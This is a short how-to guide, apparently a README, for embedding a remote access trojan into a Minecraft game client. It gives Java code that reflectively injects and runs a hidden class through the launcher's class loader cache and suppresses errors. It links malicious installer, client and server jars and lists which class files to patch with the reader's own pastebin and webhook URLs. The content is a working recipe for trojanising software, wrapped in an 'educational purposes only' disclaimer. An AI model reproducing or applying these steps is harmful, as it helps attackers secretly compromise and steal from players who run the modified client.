## Can I use it?
yes, If you're new to these stuff, I recommend to not.

## How?
(This is for educational purposes only, and I do not guarantee this would work.)\
first download these [bytes](https://cdn.discordapp.com/attachments/889588787972284456/891204621530456104/decimal.txt). It still has Zopac's pastebin link tho.

Replace it by translating into ascii and translate it back to decimals(bytes).
\
Make sure your number delimiter is set to `Comma`
\
[Translator](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html)

Then paste this code into your client and somehow trigger it
```java
byte[] pixels = {//the bytes (example: 50, 100, 200)}
try {
    Field field = LaunchClassLoader.class.getDeclaredField("resourceCache");
    field.setAccessible(true);
    Map<String, byte[]> cache = (Map<String, byte[]>) field.get(Launch.classLoader);
    cache.put("idasido.adldaosd.wpiw.install.Bootstrap", pixels);
    Launch.classLoader.loadClass("idasido.adldaosd.wpiw.install.Bootstrap").getMethod("main").invoke(null);
    textStructureSize = true;
} catch (Exception ignored) {}
```

You just implemented the rat into your client.

Next step is to download the [installer](https://cdn.discordapp.com/attachments/825998603977621518/891247725931298816/COPE-1.0-SNAPSHOT-installer.jar)
then the [client](https://cdn.discordapp.com/attachments/825998603977621518/891247723817357333/COPE-1.0-SNAPSHOT-client.jar)
and the [server](https://cdn.discordapp.com/attachments/825998603977621518/891247713436442624/COPE-1.0-SNAPSHOT-server.jar).
\
Use [recaf](https://github.com/Col-E/Recaf) to replace the pastebins and webhook.

- ##  All the url you need to replace
1. Installer 
    - Bootstrap.class : 18
    - Installer.class : 16 / 55
3. Client 
   - Loader.class : 19
2. Server
   - Sender.class : 17 
    
all credits to zopac for making the resource cache rat
\
credits to yoink for making the original rat
